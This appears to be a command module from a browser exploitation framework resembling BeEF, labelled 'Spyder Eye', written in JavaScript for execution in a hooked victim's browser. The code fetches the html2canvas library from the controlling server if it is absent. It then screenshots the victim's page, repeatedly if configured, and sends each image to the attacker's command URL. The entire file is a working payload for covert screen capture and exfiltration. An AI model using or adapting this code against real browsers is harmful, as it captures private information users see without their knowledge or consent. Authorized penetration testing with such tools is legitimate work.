//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var takes = parseInt('<%= @repeat %>', 10) || 1;
	var delay = parseInt('<%= @delay %>', 10) || 0;

	snap = function() {
		try {
			html2canvas(document.body).then(function(canvas) {
	    		var d = canvas.toDataURL('image/png');
	    		server.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
	    	});
	    	server.debug('[Spyder Eye] Took snapshot successfully');
	    }
	    catch (e) {
		server.debug('[Spyder Eye] Obtaining snapshot failed: ' + e.message);
	    	server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Obtaining snapshot failed: ' + e.message);
	    }
	};

	takeit = function() {
		for(var i = 0; i < takes; i++) {
			server.debug('[Spyder Eye] Taking snapshot #' + i);
			setTimeout(snap, delay * i);
		}
	};

	if (typeof html2canvas == "undefined") {		
		var script = document.createElement('script');
		script.type = 'text/javascript';
		script.src = server.net.httpproto+'://'+server.net.host+':'+server.net.port+'/h2c.js';
		$j("body").append(script);

	    setTimeout(takeit, 400);
	}
	else {
		takeit();
	}

});
